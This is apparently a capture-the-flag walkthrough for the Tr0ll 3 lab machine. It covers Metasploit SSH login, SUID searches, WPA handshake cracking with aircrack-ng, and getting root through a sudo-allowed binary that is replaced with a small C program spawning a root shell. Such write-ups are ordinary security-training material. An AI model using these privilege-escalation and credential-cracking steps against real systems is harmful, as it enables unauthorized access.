# Tr0ll 3

![](https://i.imgur.com/ZJsk51j.png)

![](https://i.imgur.com/1JR58TI.png)
Host is `192.168.227.132`
![](https://i.imgur.com/pvHUx81.png)
Victim is `192.168.227.135`
`nmap -sS -sV -A -p- -oN NmapTr0llLv3.txt 192.168.227.135`
![](https://i.imgur.com/YB2vQRw.png)
There's only OpenSSH opened, which without any useful exploit vuln.

I don't like this start entry, but we have no choice to use the info print out on terminal of Tr0ll3: `start:here`

```
msfconsole
search ssh
```
![](https://i.imgur.com/mKwXNlN.png)

```
use auxiliary/scanner/ssh/ssh_login
show options
set USERNAME start
set PASSWORD here
set RHOSTS 192.168.227.135
exploit
```
![](https://i.imgur.com/VFs8drk.png)
Once get the shell, upgrade to meterpreter, which suport a lot command make exploit more easier.

There's two files under home folder.
One is useless shorten URL.
![](https://i.imgur.com/PpmkULG.png)
Another one seems a AC/PW
![](https://i.imgur.com/3PzIaov.png)
But seems not work at all.
![](https://i.imgur.com/jlRLdvk.png)

Switch to shell mode by `shell` command to use `find`.
Checking for files where SUID bit is set:
`find / -perm -g=s -o -perm -4000 -exec ls -ld {} \; 2>/dev/null`
http://man7.org/linux/man-pages/man1/find.1.html
> * -perm -mode : All of the permission bits mode are set for the file.
> * g=s : The letter s denotes that the setuid (or setgid, depending on the column) bit is set. When an executable is setuid, it runs as the user who owns the executable file instead of the user who invoked the program.
> * -o : or
> * 4000 : SUID.
> * ! expr True if expr is false.  This character will also usually need protection from interpretation by the shell.
> * {} : expands to the filename of each file or directory found.
> * \; : end -exec command.

![](https://i.imgur.com/CxNnTWJ.png)
Nothing special.

`find / -perm 777 -type f -exec ls -ld {} \; 2>/dev/null`
![](https://i.imgur.com/VJZOxiD.png)
```
-rwxrwxrwx 1 root root 49962 Aug  2  2019 /var/log/.dist-manage/wytshadow.cap
-rwxrwxrwx 1 eagle russ 35737600 Aug  2  2019 /.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
exit
```
back to meterpreter:
```
download /var/log/.dist-manage/wytshadow.cap /root/
dowdnload /.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt /root/
```
![](https://i.imgur.com/QRZvWPj.png)

`wytshadow.cap` contain whole 802.11 protocal communication pakages.
![](https://i.imgur.com/3VCwDeZ.png)

`gold_star.txt` seems like a wordlist to crack the WPA-PSK pcap `wytshadow.cap`.
![](https://i.imgur.com/sC8q7sx.png)

Let's use `aircrack` to crack this.
`aircrack-ng -w gold_star.txt wytshadow.cap`

![](https://i.imgur.com/8aDAcC1.png)
Got it, the password is `gaUoCe34t1`, let's use it to ssh to machine.
![](https://i.imgur.com/YiRYYTj.png)
The username might be `wytshadow`.

![](https://i.imgur.com/QvFuRP7.png)
We in, 

![](https://i.imgur.com/OXDSVWN.png)
I'm carzy like a lyn, Lynx is a customizable text-based web browser for use on cursor-addressable character cell terminals.
https://zh.wikipedia.org/wiki/Lynx

So, let's find some default command to setup a web service.
`sudo -l`
![](https://i.imgur.com/pz5nhwc.png)

Okay, here we got `(root) /usr/sbin/service nginx start` with root privilege.

Let's see, before exec a web service, check `netstat` will help you more quickly to target the new service.
`netstat -antp`
![](https://i.imgur.com/CrsymS6.png)

Now we start the service: `sudo service nginx start`
![](https://i.imgur.com/yBCin0u.png)

Service on 8080 is new service.
![](https://i.imgur.com/Io0FTev.png)
This service is public, but something behind it block the access.
![](https://i.imgur.com/X11s8PW.png)

After check the setting in `nginx`, we founded that User-Agent is limited to only `LYNX`.
![](https://i.imgur.com/qBM4XVt.png)

Let's download `LYNX`: `apt install LYNX` on Host.
`lynx http://192.168.227.135:8080`
![](https://i.imgur.com/AN6Q1pg.png)

Here we got `genphlux:HF9nd0cR!`
Now change the user account to `genphlux`
![](https://i.imgur.com/bcXxRyV.png)

Back to `genphlux`'s home, we found two file here.
![](https://i.imgur.com/M3QZxx2.png)

`xlogin` hint me to open a apache service.
![](https://i.imgur.com/AUSox7S.png)
Then we use sudo to start the apache2.
![](https://i.imgur.com/uOu3i9E.png)
What's on the port 80?
![](https://i.imgur.com/KZN5W1y.png)
Let's see what's wrong this time.
![](https://i.imgur.com/gqy1KOY.png)
I cannot find any clue to access the Web page, maybe use RSA key as crt to make HTTPS request?

`maleus` is a RSA key. First, we try to connect ssh with this key.
![](https://i.imgur.com/Uhm9wHa.png)
Copy and paste to Host.
On Host shell,
```
chmod 600 maleus
ssh maleus@192.168.1.104 -i maleus
```
![](https://i.imgur.com/4SN7eVf.png)

Now we see there's binary `dont_even_bother` here.
![](https://i.imgur.com/cDStqh1.png)

According to past work, `sudo -l` might contain message, but we need to find a password first.

After all, I found something in the `.viminfo`

> The **vimrc** is the file you edit to change vim's behavior. It is a the configuration file.
> The **viminfo** is like a cache, to store cut buffers persistently, and other things
> The **viminfo** file is used to store:
> - The command line history.
> - The search string history.
> - The input-line history.
> - Contents of non-empty registers.
> - Marks for several files.
> - File marks, pointing to locations in files.
> - Last search/substitute pattern (for 'n' and '&').
> - The buffer list.
> - Global variables.

![](https://i.imgur.com/znPva3V.png)
We found the password: `B^slc8I$`

Let's use it to check `sudo -l`
![](https://i.imgur.com/bq719zu.png)

Now, we know that `maleus` can use sudo to exec any file named `dont_even_bother`, which is own by `maleus`, so `maleus` can simply replace it.
```c
int main (void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}
```
![](https://i.imgur.com/IZxu0ZY.png)
Compile the c source and replace the `dont_even_bother` with output.

`cd` to `/root` and `cat` the `flag.txt`.
![](https://i.imgur.com/4UwBoZU.png)

## Failed

According to Linux version is `Linux 4.15.0-55-generic`, I try some exploit at first, but either of them work.
![](https://i.imgur.com/jCh1VKC.png)

https://www.exploit-db.com/exploits/47165
![](https://i.imgur.com/JGBOh0F.png)

https://www.exploit-db.com/exploits/47163
![](https://i.imgur.com/ABSQ8FY.png)
